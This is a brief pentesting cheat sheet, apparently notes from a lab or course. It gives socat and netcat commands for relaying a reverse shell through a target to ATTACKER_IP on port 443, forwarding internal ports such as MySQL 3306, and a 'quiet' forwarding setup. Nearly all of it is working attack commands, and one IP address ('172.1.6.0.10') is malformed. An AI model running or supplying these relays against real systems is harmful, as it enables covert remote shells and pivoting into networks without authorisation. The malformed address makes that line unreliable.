## Reverse shell relay

### Attacker: sudo nc -lvnp 443 

### Target: ./socat tcp-l:8000 tcp:ATTACKER_IP:443 &

## Port Forwarding

 - ./socat tcp-l:33060,fork,reuseaddr tcp:172.1.6.0.10:3306 &

 - socat TCP-LISTEN:1234,fork,reuseaddr tcp:127.0.0.1:8080 & (Run this on target machine, then browse to TARGET_IP:1234 from Kali machine to access the application)

#### Fork: Puts every connection into a new process

#### Reuseaddr: The port stays open after a connection is made to it.

## Port forwarding (Quiet)

### Attacker: socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &

### Target: ./socat tcp:ATTACKER_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &

## Close backgrounded socat

### 1: jobs

### kill %num of process

